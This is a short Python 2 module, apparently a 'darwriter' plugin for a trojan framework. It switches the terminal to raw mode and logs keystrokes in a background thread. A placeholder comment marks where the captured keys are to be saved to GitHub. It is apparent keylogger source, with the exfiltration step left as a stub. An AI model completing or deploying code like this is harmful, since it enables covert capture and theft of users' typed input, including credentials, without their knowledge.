import atexit
import curses
import fcntl
import os
import sys
import time
import termios
import threading
import tty

old_settings = None


def init_anykey():
    global old_settings
    old_settings = termios.tcgetattr(sys.stdin)
    new_settings = termios.tcgetattr(sys.stdin)
    new_settings[3] = new_settings[3] & ~(termios.ECHO | termios.ICANON) # lflags
    new_settings[6][termios.VMIN] = 0  # cc
    new_settings[6][termios.VTIME] = 0  # cc
    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, new_settings)


@atexit.register
def term_anykey():
    global old_settings
    if old_settings:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)


def anykey():
    ch_set = []
    ch = os.read(sys.stdin.fileno(), 1)
    while ch is not None and len(ch) > 0:
        ch_set.append(ord(ch[0]))
        ch = os.read(sys.stdin.fileno(), 1)
    return ch_set;


def main_writer():
    data = []
    print("MAIN WRITER !!!!")
    updated = time.time()
    init_anykey()
    while True:
        key = anykey()
        if len(key) > 0:
            print key
            data += key

            if len(data) > 15 and time.time() - updated > 300:
                # Save data to github
                pass
        else:
            time.sleep(0.1)


def run(**args):
    if 'thread' not in args:
        print "[x] Error! Missing argument 'thread'"
        return

    print "[*] In darwriter module (%s)." % str(args['thread'])
    if not args['thread']:
        t = threading.Thread(target=main_writer)
        t.start()
        return t

    return args['thread']
